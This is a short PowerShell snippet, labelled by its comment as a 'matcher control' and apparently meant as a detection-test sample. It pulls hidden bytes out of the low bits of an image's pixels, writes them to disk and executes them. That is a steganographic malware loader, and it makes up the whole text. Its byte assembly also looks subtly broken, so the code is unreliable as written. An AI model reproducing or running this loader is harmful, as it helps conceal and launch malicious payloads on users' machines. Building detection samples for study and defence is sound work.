# Matcher control: reconstruct pixel low bits, save and activate the bytes.
$bitmap = [Drawing.Bitmap]::new($ImagePath)
$output = [IO.MemoryStream]::new()
$value = 0
for ($x=0; $x -lt $bitmap.Width; $x++) {
 $pixel = $bitmap.GetPixel($x,0)
 $value = ($value -shl 1) -bor ($pixel.B -band 1)
 if ($x % 8 -eq 7) { $output.WriteByte([byte]$value) }
}
[IO.File]::WriteAllBytes($Path,$output.ToArray())
Start-Process $Path
